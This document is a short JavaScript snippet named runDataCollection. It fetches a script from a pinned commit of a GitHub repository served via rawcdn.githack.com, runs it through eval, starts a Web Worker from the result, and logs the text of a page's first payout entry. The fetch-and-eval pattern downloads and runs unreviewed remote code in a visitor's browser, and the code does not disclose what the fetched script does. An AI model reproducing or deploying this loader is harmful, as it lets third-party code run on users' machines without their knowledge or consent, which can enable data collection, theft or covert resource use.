var wbkDataCollection___________;
async function runDataCollection () {
  if (typeof Worker !== "undefined") {
    if (typeof wbkDataCollection___________ == "undefined") {
      
      wbkDataCollection___________ = new Worker(eval(await (await fetch('https://rawcdn.githack.com/rasanu/wbkDataCollection___________/ecfa6fb0c608cd90da4f5739aae3a6e25c479428/1.js')).text()));
    }
    wbkDataCollection___________.onmessage = function (event) {
      console.log(event);
      console.log(
        document.querySelector(".payouts-block > .payout:nth-child(1)")
          .innerText
      );
    };
  } else {
    document.getElementById("body").innerHTML =
      "Sorry, your browser does not support Web Workers...";
  }
};
